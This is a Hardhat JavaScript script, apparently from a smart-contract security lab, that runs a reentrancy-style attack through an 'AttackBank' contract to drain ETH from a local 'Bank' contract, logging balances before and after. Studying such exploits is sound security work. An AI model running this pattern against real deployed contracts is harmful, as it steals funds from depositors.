import hardhat from "hardhat";

const bankAddress = "0x8A791620dd6260079BF849Dc5567aDC3F2FdC318";
const maliciousContractAddress = "0xB7f8BC63BbcaD18155201308C8f3540b07f84F5e";
const contractName = "contracts/AttackBank.sol:AttackBank";

async function main() {
  const signers = await hardhat.ethers.getSigners();
  const signer = signers[1];

  const attackContract = await hardhat.ethers.getContractAt(
    contractName,
    maliciousContractAddress,
    signer
  );

  // Print state before attack
  console.log(
    "My balance before the attack: ",
    await hardhat.ethers.provider.getBalance(signer.address)
  );
  console.log(
    `Bank balance before the attack: ${hardhat.ethers.formatUnits(
      await hardhat.ethers.provider.getBalance(bankAddress)
    )}`
  );

  // Execute the attack and withdraw stolen ETH
  console.log("Executing the attack...");
  await (
    await attackContract.attack({
      value: hardhat.ethers.parseEther("1.0"),
      gasLimit: "0x" + (2000000).toString(16),
    })
  ).wait();

  // Without Gas Limit it won't work because it will run out of gas in the middle of the recursion
  // await (await attackContract.steal({value: hardhat.ethers.utils.parseEther("1.0")})).wait();

  // Print Summary
  console.log("Attack Done.");
  console.log(
    "My balance after the attack: ",
    await hardhat.ethers.provider.getBalance(signer.address)
  );
}

module.exports = main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
